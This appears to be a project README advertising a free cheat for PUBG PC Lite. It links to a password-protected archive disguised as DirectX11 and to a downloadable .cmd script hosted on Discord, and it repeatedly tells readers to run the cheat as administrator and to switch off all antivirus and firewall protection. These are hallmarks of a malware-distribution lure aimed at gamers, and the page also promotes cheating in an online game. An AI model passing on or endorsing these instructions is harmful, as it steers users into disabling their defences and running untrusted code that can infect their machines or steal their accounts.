# PUBG-PC-LITE-v.1234
PUBG PC LITE Hack ver.1234
Password : 1
STATUS : UNDETECTED

Discord Server : https://discord.gg/uPmF7D5mcN

Watch before using cheat
https://www.youtube.com/watch?v=vyPKH7iFTz4&feature=youtu.be

Install this : http://www.mediafire.com/file/ogh5b9h3pbsd8jq/DirectX11.rar/file

Run cheat as "ADMINISTRATOR"
Turn OFF all your anti-virus and firewall.

SAFE MODE (PUBG PC LITE)


F1 - OFF
F2 - ON
F3 - OFF
F4 - ON
F5 - OFF
F6 - OFF
F7 - OFF
F8 - ON
F9 - OFF
F10 - OFF

CRTL + 1 - OFF
CRTL + 2 - ON
CRTL + 3 - ON
CRTL + 4 - ON
CRTL + 5 - ON
CRTL + 6 - ON
CRTL + 7 - ON
CRTL + 8 - ON
CRTL + 9 - ON
CRTL + 0 - ON

Run cheat as "ADMINISTRATOR"
Turn OFF all your anti-virus and firewall.
If cheat does not inject use this file : https://cdn.discordapp.com/attachments/766059875725082625/767880762141442088/Freeh4ck_Memory.cmd (This will fix the thing and restart your device)
Make use you have up-to-date Microsoft Redistribution files. ( https://cdn.discordapp.com/attachments/765653097137438731/778932280826789909/unknown.png )

If cheat gives you a error of blue screen the see this video : https://www.youtube.com/watch?v=sxouVcgCMmM
                                                               https://www.youtube.com/watch?v=EZvUEf_gB5U
If you  get any other issues regarding cheat or anything join discord server : https://discord.gg/freeh4ck


Website : https://freeh4ckcompany.github.io
Support us by donating : https://www.paypal.com/paypalme/z14i
